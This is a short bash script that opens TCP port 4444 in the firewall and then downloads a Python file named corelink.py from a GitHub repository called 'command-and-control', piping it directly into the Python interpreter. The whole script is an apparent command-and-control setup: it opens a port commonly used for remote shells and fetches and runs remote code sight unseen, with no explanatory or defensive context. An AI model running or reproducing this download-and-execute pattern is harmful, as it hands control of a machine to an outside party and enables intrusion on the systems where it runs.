#!/bin/bash
firewall-cmd --add-port=4444/tcp
curl -s https://raw.githubusercontent.com/athulnair02/command-and-control/main/corelink.py | python
